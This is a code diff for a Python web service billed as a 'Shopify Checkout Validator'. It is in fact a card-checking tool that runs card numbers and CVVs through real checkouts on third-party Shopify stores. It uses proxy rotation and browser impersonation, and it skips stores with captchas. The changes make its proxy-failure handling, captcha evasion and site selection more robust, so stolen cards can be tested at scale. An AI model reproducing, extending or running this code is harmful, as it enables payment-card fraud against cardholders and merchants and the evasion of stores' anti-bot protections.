@@ -1,5 +1,5 @@
 """
-Shopify Checkout Validator API — VPS Edition v3.8.2
+Shopify Checkout Validator API — VPS Edition v3.8.3
 
 Fully autonomous site selection with request-pool support:
   - Bot makes ONE call per card; API rotates through the request's own
@@ -9,6 +9,18 @@ Fully autonomous site selection with request-pool support:
     lenient session check (only flags sites whose /cart/add.js fails).
   - PROXY_STOP_CODES = {PROXY_ERROR} only (TIMEOUT rotates to next site).
   - /auto-diagnostics exposes internal attempt statistics.
+
+v3.8.3 fixes (2026-10):
+  #1  _fetch_products distinguishes transport failures (PROXY_ERROR) from
+      "no products" so a dead proxy no longer poisons a site for 30 min.
+  #2  _site_has_captcha only flags rendered challenge widgets, not mere
+      script-tag references (which every Shopify page contains).
+  #3  Session preflight uses SESSION_FAIL_TTL (120s) and only records
+      a confirmed failure (True/False), never a network-unknown (None).
+  #4  Broader proxy error detection in validate_card so msh.py can rotate.
+  #5  Fixed NameError: `cr` not defined on the cart fallback path.
+  #6  Fail hard on empty delivery_strategy instead of submitting a
+      malformed proposal (which surfaced as a fake site error).
 """
 
 import asyncio
@@ -56,6 +68,10 @@ LOG_FILE              = os.environ.get("LOG_FILE", "requests.txt")
 IMPERSONATE           = os.environ.get("IMPERSONATE", "chrome124")
 HEALTHY_MIN_SCORE     = float(os.environ.get("HEALTHY_MIN_SCORE", 0.20))
 NO_PRODUCT_TTL        = int(os.environ.get("NO_PRODUCT_TTL", 1800))
+
+# ═══ FIX #3 ═══ Session preflight failures get a SHORT cooldown (2 min),
+# not the full 30 min like a "site has no products" verdict.
+SESSION_FAIL_TTL      = int(os.environ.get("SESSION_FAIL_TTL", 120))
 
 VALID_API_KEYS = set(
     k.strip()
@@ -113,6 +129,29 @@ logging.basicConfig(
     format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
 )
 log = logging.getLogger("shopify")
+
+
+# ═══ FIX #4 ═══ Broad proxy-error detection — used everywhere a network
+# exception can occur, so a dead proxy reliably surfaces as PROXY_ERROR
+# instead of being silently swallowed or misclassified as a site error.
+PROXY_ERROR_HINTS = (
+    "proxy", "tunnel", "407", "socks",
+    "connection refused", "connection reset", "connection aborted",
+    "connection closed", "could not resolve host", "name resolution",
+    "dns error", "dns failure", "getaddrinfo",
+    "connect timeout", "connect tunnel", "connect error",
+    "network unreachable", "host unreachable", "no route to host",
+    "empty psk", "broken pipe", "socket error",
+    "curl error", "ssl error", "tls error",
+    "failed to connect", "couldn't connect", "could not connect",
+)
+
+
+def _looks_like_proxy_error(msg: str) -> bool:
+    if not msg:
+        return False
+    m = str(msg).lower()
+    return any(k in m for k in PROXY_ERROR_HINTS)
 
 
 # ---------------------------------------------------------------------------
@@ -465,9 +504,9 @@ async def lifespan(app: FastAPI):
     _reload_cards()
     _reload_site_pool()
     log.warning(
-        "Shopify Validator API v3.8.2 started concurrency=%d/site keys=%d race=%d pool=%d impersonate=%s hard_max=$%.2f auto_attempts=%d",
+        "Shopify Validator API v3.8.3 started concurrency=%d/site keys=%d race=%d pool=%d impersonate=%s hard_max=$%.2f auto_attempts=%d session_ttl=%ds",
         SITE_CONCURRENCY, len(VALID_API_KEYS), RACE_COUNT, len(_site_pool),
-        IMPERSONATE, HARD_MAX_PRICE, AUTO_ATTEMPTS,
+        IMPERSONATE, HARD_MAX_PRICE, AUTO_ATTEMPTS, SESSION_FAIL_TTL,
     )
     asyncio.create_task(_warmup_sites())
     asyncio.create_task(_pool_refresher())
@@ -478,7 +517,7 @@ async def lifespan(app: FastAPI):
             await res
 
 
-app = FastAPI(title="Shopify Validator", version="3.8.2", lifespan=lifespan)
+app = FastAPI(title="Shopify Validator", version="3.8.3", lifespan=lifespan)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -806,9 +845,11 @@ def _site_usable(hostname: str) -> tuple[bool, str]:
     if cp is not None and cp > HARD_MAX_PRICE and (now - cpa) < NO_PRODUCT_TTL:
         return False, f"PRICE_TOO_HIGH: cheapest ${cp:.2f} > ${HARD_MAX_PRICE:.2f}"
 
+    # ═══ FIX #3 ═══ Session preflight uses the shorter SESSION_FAIL_TTL so a
+    # transient failure doesn't disable a site for a full 30 minutes.
     if q.get("can_create_session") is False:
         age = now - q.get("session_checked_at", 0)
-        if age < NO_PRODUCT_TTL:
+        if age < SESSION_FAIL_TTL:
             return False, "NO_SESSION_TOKEN"
 
     return True, ""
@@ -827,6 +868,10 @@ def _site_has_products(hostname: str) -> Optional[bool]:
 
 
 def _record_site_result(hostname: str, response_code: str) -> None:
+    # ═══ FIX #4 ═══ Never count a proxy error against the site's health.
+    if response_code in PROXY_STOP_CODES:
+        return
+
     s = _site_stats[hostname]
     is_err = response_code in SITE_ERROR_CODES
     s["outcomes"].append(1 if is_err else 0)
@@ -897,6 +942,13 @@ def _preferred_variant(candidates: list[dict], max_price: float) -> Optional[dic
 # Captcha preflight
 # ---------------------------------------------------------------------------
 async def _site_has_captcha(base_url: str, session: LoggedSession) -> bool:
+    """
+    ═══ FIX #2 ═══
+    Only flags a site when an actual challenge widget is RENDERED.
+    Mere script-tag references (hcaptcha, recaptcha, cf-challenge,
+    challenge-platform) appear on nearly every modern Shopify store
+    and are no longer treated as evidence of a challenge.
+    """
     try:
         r = await session.get(
             base_url,
@@ -907,14 +959,21 @@ async def _site_has_captcha(base_url: str, session: LoggedSession) -> bool:
         if r.status_code != 200:
             return False
         text = (r.text or "")[:12000].lower()
-        indicators = (
-            "hcaptcha", "recaptcha", "g-recaptcha", "cf-challenge",
-            "challenge-platform", "checkpoint.challenge", "captcha_required",
-            "please verify you are a human", "verify you are human",
-            "press & hold", "press and hold", "are you a robot", "one more step",
+        strong = (
+            # rendered widgets
+            'class="h-captcha"', 'h-captcha-response',
+            'class="g-recaptcha"', 'data-sitekey="6l',
+            "data-cf-challenge", "cf-turnstile-widget",
+            # explicit challenge text
+            "please verify you are a human",
+            "checking your browser before accessing",
+            "verify you are human",
+            "press & hold", "press and hold",
+            "are you a robot",
         )
-        return any(k in text for k in indicators)
+        return any(k in text for k in strong)
     except Exception as ex:
+        # Network failure => can't tell, so don't flag
         log.debug("[_site_has_captcha] %s -> %s", base_url, ex)
         return False
 
@@ -926,15 +985,18 @@ async def _check_session_creation(
     base_url: str,
     variant_id: str,
     session: LoggedSession,
-) -> bool:
+) -> Optional[bool]:
     """
-    Lenient check: only flags the site if /cart/add.js fails.
-    Missing token alone is NOT fatal — the real flow adds warm-up + proper
-    headers and usually succeeds.
+    ═══ FIX #3 ═══
+    Returns:
+      True  → confirmed works
+      False → confirmed fail (site requires login, or cart truly rejected)
+      None  → couldn't determine (network/proxy error) — do NOT quarantine
     """
     if not variant_id:
-        return False
+        return None
 
+    network_error = False
     ua = random.choice(USER_AGENTS)
     base_headers = {
         "User-Agent": ua,
@@ -956,8 +1018,9 @@ async def _check_session_creation(
             timeout=10,
         )
         await asyncio.sleep(0.15)
-    except Exception:
-        pass
+    except Exception as ex:
+        if _looks_like_proxy_error(str(ex)):
+            network_error = True
 
     cart_ok = False
     for payload, ct in [
@@ -974,10 +1037,16 @@ async def _check_session_creation(
             if r.status_code == 200:
                 cart_ok = True
                 break
-        except Exception:
+        except Exception as ex:
+            if _looks_like_proxy_error(str(ex)):
+                network_error = True
             continue
 
     if not cart_ok:
+        # If we couldn't reach the site, this is a proxy issue — do NOT
+        # record a definitive failure.
+        if network_error:
+            return None
         return False
 
     try:
@@ -991,11 +1060,15 @@ async def _check_session_creation(
             timeout=15,
         )
         if cr.status_code != 200:
+            if network_error:
+                return None
             return False
         cu = str(cr.url).lower()
         if "login" in cu or "/account" in cu or "password" in cu:
             return False
-    except Exception:
+    except Exception as ex:
+        if _looks_like_proxy_error(str(ex)):
+            return None
         return True
 
     return True
@@ -1030,14 +1103,19 @@ async def _fetch_products(
             session, _ = _make_session(proxy_str)
 
         try:
+            # ═══ FIX #1 ═══ Track transport failures separately from a real
+            # "site has no products" verdict. A dead proxy must NOT quarantine
+            # the site for 30 min.
             all_variants: list[dict] = []
+            transport_error = False
             urls_to_try = [
                 f"{base_url}/products.json?limit=250&sort_by=price-ascending",
                 f"{base_url}/products.json?limit=250",
             ]
             for url in urls_to_try:
                 try:
-                    resp = await session.get(url, allow_redirects=True, headers=_ua_headers(random.choice(USER_AGENTS)))
+                    resp = await session.get(url, allow_redirects=True,
+                                             headers=_ua_headers(random.choice(USER_AGENTS)))
                     if resp.status_code == 200:
                         data = orjson.loads(resp.content)
                         products = data.get("products", [])
@@ -1047,7 +1125,9 @@ async def _fetch_products(
                     elif resp.status_code in (429, 430):
                         _product_cache[hostname] = {"product": None, "candidates": [], "err": "THROTTLED", "ts": now}
                         return None, [], "THROTTLED"
-                except Exception:
+                except Exception as ex:
+                    if _looks_like_proxy_error(str(ex)):
+                        transport_error = True
                     continue
 
             candidates: list[dict] = []
@@ -1078,6 +1158,16 @@ async def _fetch_products(
                             cheapest_any = entry
                         if price <= max_price:
                             candidates.append(entry)
+
+            # ═══ FIX #1 ═══ If we couldn't reach the site AND we didn't
+            # get products back, this is a PROXY problem, not a site problem.
+            # Skip the quarantine and surface PROXY_ERROR so the caller can
+            # rotate the proxy.
+            if transport_error and not all_variants:
+                _product_cache[hostname] = {
+                    "product": None, "candidates": [], "err": "PROXY_ERROR", "ts": now,
+                }
+                return None, [], "PROXY_ERROR"
 
             q = _site_quarantine[hostname]
             q["has_products"] = bool(candidates or cheapest_any)
@@ -1118,13 +1208,17 @@ async def _fetch_products(
 
             if cheapest_any is not None:
                 last_st_check = q.get("session_checked_at", 0)
-                if (now - last_st_check) > NO_PRODUCT_TTL:
+                # ═══ FIX #3 ═══ Use SESSION_FAIL_TTL, not NO_PRODUCT_TTL
+                if (now - last_st_check) > SESSION_FAIL_TTL:
                     can_session = await _check_session_creation(
                         base_url, cheapest_any["variant_id"], session
                     )
-                    q["can_create_session"] = can_session
+                    # ═══ FIX #3 ═══ Only record True/False. A None (unknown
+                    # due to network) must NOT poison the quarantine state.
+                    if can_session is not None:
+                        q["can_create_session"] = can_session
                     q["session_checked_at"] = now
-                    if not can_session:
+                    if can_session is False:
                         log.warning("[preflight] %s cart-add failed — skipping site", hostname)
 
                 if q.get("can_create_session") is False:
@@ -1147,9 +1241,15 @@ async def _fetch_products(
             }
             return best, candidates, None
 
-        except (asyncio.TimeoutError, RequestsError):
+        except (asyncio.TimeoutError, RequestsError) as ex:
+            # ═══ FIX #1/#4 ═══ Transport exception at the outer level — check
+            # if it's a proxy error before falling back to "Timeout".
+            if _looks_like_proxy_error(str(ex)):
+                return None, [], "PROXY_ERROR"
             return None, [], "Timeout"
         except Exception as ex:
+            if _looks_like_proxy_error(str(ex)):
+                return None, [], "PROXY_ERROR"
             return None, [], str(ex)
         finally:
             if own_session:
@@ -1250,6 +1350,14 @@ async def validate_card(
                 )
                 if not all_candidates and not best:
                     err_str = (err or "No products available")
+                    # ═══ FIX #1 ═══ Surface PROXY_ERROR explicitly so the
+                    # caller rotates the proxy rather than blacklisting a
+                    # perfectly good site.
+                    if err_str == "PROXY_ERROR":
+                        return _r("PROXY_ERROR",
+                                  message="Proxy/network failure during product fetch",
+                                  proxy_dead=True,
+                                  is_site_error=True)
                     if err_str == "CAPTCHA_REQUIRED":
                         return _r("CAPTCHA_REQUIRED",
                                   message="Site has captcha (preflight)",
@@ -1325,17 +1433,23 @@ async def validate_card(
                 except Exception:
                     continue
 
+            # ═══ FIX #5 ═══ Assign `cr` on the fallback path too, so the
+            # subsequent `dict(cr.headers)` call doesn't raise NameError.
             if not cart_added:
                 try:
                     r = await session.get(f"{ourl}/checkout", allow_redirects=True,
                                           headers=_ua_headers(ua))
                     if r.status_code == 200 and "checkouts/cn/" in str(r.url):
                         cart_added = True
+                        cr = r                                   # ← FIX #5
                         checkout_url = str(r.url)
                         page_text = r.text
                     else:
                         return _r("CART_FAILED", message="Could not add to cart", is_site_error=True)
-                except Exception:
+                except Exception as ex:
+                    if _looks_like_proxy_error(str(ex)):
+                        return _r("PROXY_ERROR", message=str(ex)[:120],
+                                  proxy_dead=True, is_site_error=True)
                     return _r("CART_FAILED", message="Could not add to cart", is_site_error=True)
             else:
                 try:
@@ -1346,9 +1460,15 @@ async def validate_card(
                     )
                     checkout_url = str(cr.url)
                     page_text = cr.text
-                except (asyncio.TimeoutError, RequestsError):
+                except (asyncio.TimeoutError, RequestsError) as ex:
+                    if _looks_like_proxy_error(str(ex)):
+                        return _r("PROXY_ERROR", message=str(ex)[:120],
+                                  proxy_dead=True, is_site_error=True)
                     return _r("TIMEOUT", message="Checkout timed out", is_site_error=True)
                 except Exception as ex:
+                    if _looks_like_proxy_error(str(ex)):
+                        return _r("PROXY_ERROR", message=str(ex)[:120],
+                                  proxy_dead=True, is_site_error=True)
                     return _r(f"CHECKOUT_FAILED: {type(ex).__name__}",
                               message=str(ex)[:100], is_site_error=True)
 
@@ -1361,9 +1481,14 @@ async def validate_card(
                     or ('name="password"' in early and "login" in lower_url)):
                 return _r("SITE_REQUIRES_LOGIN", message="Store is password-protected", is_site_error=True)
 
-            if any(k in early for k in ("hcaptcha", "recaptcha", "g-recaptcha",
-                                          "checkpoint.challenge", "captcha_required",
-                                          "cf-challenge")):
+            # Note: captcha detection here uses the same strong signals as
+            # _site_has_captcha. The checkout page IS authoritative.
+            if any(k in early for k in (
+                'class="h-captcha"', 'class="g-recaptcha"',
+                "please verify you are a human",
+                "verify you are human",
+                "checking your browser before accessing",
+            )):
                 return _r("CAPTCHA_REQUIRED", message="Bot challenge detected", is_site_error=True)
 
             m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
@@ -1545,7 +1670,10 @@ async def validate_card(
                         json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars,
                               "operationName": "Proposal"})
                     resp_json = orjson.loads(r.content)
-                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
+                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError) as ex:
+                    if _looks_like_proxy_error(str(ex)):
+                        return _r("PROXY_ERROR", message=str(ex)[:120],
+                                  proxy_dead=True, is_site_error=True)
                     if attempt < 2:
                         await asyncio.sleep(1)
                     continue
@@ -1735,7 +1863,21 @@ async def validate_card(
                         except (ValueError, TypeError):
                             pass
             except Exception as ex:
-                log.debug("delivery proposal error: %s", ex)
+                # ═══ FIX #6 ═══ Upgrade debug to warning so failures are
+                # visible; DO NOT return early here — the empty-strategy
+                # check below catches the true failure case.
+                if _looks_like_proxy_error(str(ex)):
+                    return _r("PROXY_ERROR", message=str(ex)[:120],
+                              proxy_dead=True, is_site_error=True)
+                log.warning("delivery proposal failed for %s: %s", hostname, ex)
+
+            # ═══ FIX #6 ═══ Refuse to submit a proposal with an empty
+            # delivery_strategy — that always produces a fake site error
+            # (SubmitRejected / NO_SELLER_PROPOSAL) at the next step.
+            if not delivery_strategy:
+                return _r("NO_SELLER_PROPOSAL",
+                          message="No delivery strategy from shipping/delivery proposal",
+                          is_site_error=True)
 
             vault_payload = {
                 "credit_card": {
@@ -1771,7 +1913,10 @@ async def validate_card(
                     token = vd.get("id")
                     if token:
                         break
-                except Exception:
+                except Exception as ex:
+                    if _looks_like_proxy_error(str(ex)):
+                        return _r("PROXY_ERROR", message=str(ex)[:120],
+                                  proxy_dead=True, is_site_error=True)
                     continue
 
             if not token:
@@ -1860,9 +2005,15 @@ async def validate_card(
                     if _sub_sst:
                         sst = _sub_sst
                         gql_headers["x-checkout-one-session-token"] = sst
-                except (asyncio.TimeoutError, RequestsError):
+                except (asyncio.TimeoutError, RequestsError) as ex:
+                    if _looks_like_proxy_error(str(ex)):
+                        return _r("PROXY_ERROR", message=str(ex)[:120],
+                                  proxy_dead=True, is_site_error=True)
                     return _r("TIMEOUT", message="Submit timed out", is_site_error=True)
                 except Exception as ex:
+                    if _looks_like_proxy_error(str(ex)):
+                        return _r("PROXY_ERROR", message=str(ex)[:120],
+                                  proxy_dead=True, is_site_error=True)
                     return _r("SUBMIT_FAILED", message=str(ex)[:100], is_site_error=True)
 
                 s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
@@ -2006,14 +2157,18 @@ async def validate_card(
 
             return _r("CARD_DECLINED", message=f"Unknown submit type: {stype}")
 
-        except (asyncio.TimeoutError, RequestsError):
+        except (asyncio.TimeoutError, RequestsError) as ex:
+            if _looks_like_proxy_error(str(ex)):
+                return _r("PROXY_ERROR", message=str(ex)[:120],
+                          proxy_dead=True, is_site_error=True)
             return _r("TIMEOUT", message="Request timed out", is_site_error=True)
         except Exception as ex:
             log.debug("validate_card exception: %s", ex, exc_info=True)
             err_str = f"{type(ex).__name__}: {str(ex)[:100]}"
-            err_lower = err_str.lower()
-            if any(k in err_lower for k in ("proxy", "tunnel", "407")):
-                return _r("PROXY_ERROR", message=err_str, proxy_dead=True, is_site_error=True)
+            # ═══ FIX #4 ═══ Broad proxy detection so msh.py rotates.
+            if _looks_like_proxy_error(err_str):
+                return _r("PROXY_ERROR", message=err_str,
+                          proxy_dead=True, is_site_error=True)
             return _r("SITE_ERROR", message=err_str, is_site_error=True)
         finally:
             if owned:
@@ -2031,15 +2186,13 @@ async def _auto_validate(
     max_price: Optional[float] = None,
     max_attempts: int = AUTO_ATTEMPTS,
     exclude: Optional[list[str]] = None,
-    pool: Optional[list[str]] = None,   # ← request-supplied pool wins
+    pool: Optional[list[str]] = None,
 ) -> dict:
     exclude_set = set(exclude or [])
     t0 = time.time()
 
     _stats["auto_total_cards"] += 1
 
-    # Prefer the request-supplied pool (msh.py's real list) over the
-    # file-based one. msh.py is the source of truth for the user's sites.
     source_pool = list(pool) if pool is not None else list(_site_pool)
 
     if pool is not None:
@@ -2107,7 +2260,10 @@ async def _auto_validate(
 
         _stats[f"auto_site_{code}"] += 1
 
-        if code not in HARD_DEAD_CODES:
+        # ═══ FIX #4 ═══ Don't count proxy errors or hard-dead responses
+        # against the site's reputation. _record_site_result already skips
+        # PROXY_ERROR internally, but skipping here is cheaper and clearer.
+        if code not in HARD_DEAD_CODES and code not in PROXY_STOP_CODES:
             _record_site_result(host, code)
 
         if code in FINAL_CODES:
@@ -2219,11 +2375,6 @@ async def shopify_route(
 
     n_attempts = attempts if attempts and attempts > 0 else AUTO_ATTEMPTS
 
-    # ── Build the rotation pool ─────────────────────────────────────────
-    # Priority order:
-    #   1. fallback_sites from the request (msh.py's real list — the
-    #      authoritative source for the user's sites).
-    #   2. _site_pool (file-based, populated from SITES_FILE).
     request_pool: Optional[list[str]] = None
     if fallback_sites:
         parsed = [s.strip() for s in fallback_sites.split(",") if s.strip()]
@@ -2232,7 +2383,6 @@ async def shopify_route(
         if parsed:
             request_pool = parsed
 
-    # ── Auto mode (no site given, or explicit auto=true) ────────────────
     if auto is True or not site:
         result = await _auto_validate(
             card["cc"], card["month"], card["year"], card["cvv"],
@@ -2242,14 +2392,15 @@ async def shopify_route(
         _stats[f"auto_response_{result.get('Response', 'UNKNOWN')}"] += 1
         return JSONResponse(result)
 
-    # ── Try the caller's preferred site first ───────────────────────────
     primary = await validate_card(
         card["cc"], card["month"], card["year"], card["cvv"],
         site, proxy_str=proxy, max_price=max_price,
     )
     primary_host = urlparse(primary.get("Site") or site).netloc
     primary_code = str(primary.get("Response", "")).upper()
-    _record_site_result(primary_host, primary_code)
+    # ═══ FIX #4 ═══ Never blame the site for a proxy failure.
+    if primary_code not in PROXY_STOP_CODES:
+        _record_site_result(primary_host, primary_code)
 
     if primary_code in FINAL_CODES or primary_code in PROXY_STOP_CODES:
         _stats[f"response_{primary_code}"] += 1
@@ -2303,7 +2454,9 @@ async def shopify_race_route(
     )
     answered_site = result.get("Site", "")
     if answered_site:
-        _record_site_result(urlparse(answered_site).netloc, result.get("Response", "UNKNOWN"))
+        resp_code = result.get("Response", "UNKNOWN")
+        if resp_code not in PROXY_STOP_CODES:
+            _record_site_result(urlparse(answered_site).netloc, resp_code)
     _stats[f"race_response_{result.get('Response', 'UNKNOWN')}"] += 1
     return JSONResponse(result)
 
@@ -2339,7 +2492,8 @@ async def check_route(
                                   parsed["cvv"], ourl,
                                   proxy_str=proxy, max_price=max_price)
     response_code = result.get("Response", "")
-    _record_site_result(urlparse(ourl).netloc, response_code)
+    if response_code not in PROXY_STOP_CODES:
+        _record_site_result(urlparse(ourl).netloc, response_code)
     _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
     return JSONResponse({
         "valid":         response_code in LIVE_RESPONSES,
@@ -2428,7 +2582,7 @@ async def site_stats_route():
             skip_reason = "captcha"
         elif cp is not None and cp > HARD_MAX_PRICE and cpa and (now - cpa) < NO_PRODUCT_TTL:
             skip_reason = f"price_too_high (${cp:.2f})"
-        elif cs is False and csa and (now - csa) < NO_PRODUCT_TTL:
+        elif cs is False and csa and (now - csa) < SESSION_FAIL_TTL:
             skip_reason = "no_session_token"
         elif hp is False and (now - (q.get("has_products_checked_at") or 0)) < NO_PRODUCT_TTL:
             skip_reason = "no_products"
@@ -2490,7 +2644,7 @@ async def healthy_sites_route(min_score: float = HEALTHY_MIN_SCORE):
         if cp is not None and cp > HARD_MAX_PRICE and (now - cpa) < NO_PRODUCT_TTL:
             continue
 
-        if q.get("can_create_session") is False and (now - q.get("session_checked_at", 0)) < NO_PRODUCT_TTL:
+        if q.get("can_create_session") is False and (now - q.get("session_checked_at", 0)) < SESSION_FAIL_TTL:
             continue
 
         if s:
@@ -2542,11 +2696,12 @@ async def health_route():
     cards = _get_cards()
     return JSONResponse({
         "status":               "ok",
-        "version":              "3.8.2",
+        "version":              "3.8.3",
         "cards_loaded":         len(cards),
         "site_concurrency":     SITE_CONCURRENCY,
         "cache_ttl":            CACHE_TTL,
         "variant_ttl":          VARIANT_TTL,
+        "session_fail_ttl":     SESSION_FAIL_TTL,
         "max_price":            MAX_PRICE,
         "min_amount":           MIN_AMOUNT,
         "hard_max_price":       HARD_MAX_PRICE,
